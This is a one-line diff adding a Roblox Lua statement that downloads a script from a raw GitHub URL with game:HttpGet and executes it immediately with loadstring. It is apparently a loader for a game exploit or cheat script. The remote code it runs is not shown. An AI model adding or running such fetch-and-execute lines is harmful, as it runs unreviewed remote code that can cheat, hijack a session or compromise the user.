@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Biskus0/BugEvolution/refs/heads/main/Loading.lua"))()
